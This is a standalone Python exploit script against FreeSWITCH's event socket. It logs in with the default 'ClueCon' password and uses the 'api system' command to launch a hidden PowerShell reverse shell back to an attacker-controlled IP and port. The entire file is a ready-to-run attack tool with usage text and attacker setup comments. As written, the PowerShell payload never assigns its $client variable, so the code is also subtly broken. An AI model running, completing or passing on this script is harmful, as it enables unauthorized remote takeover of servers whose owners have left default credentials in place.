#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 2:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target>')
    sys.exit(1)

ADDRESS = sys.argv[1]
PASSWORD = 'ClueCon'  # default password for FreeSWITCH

# Your attacker's IP address and the port for the reverse shell
ATTACKER_IP = 'YOUR_ATTACKER_IP'  # Change this to your attacker's IP
ATTACKER_PORT = 4444  # The port where your listener is waiting

# Reverse shell command using PowerShell
CMD = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{ATTACKER_IP}\',{ATTACKER_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"'

# Connect to the FreeSWITCH service
s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        # Send reverse shell command
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)
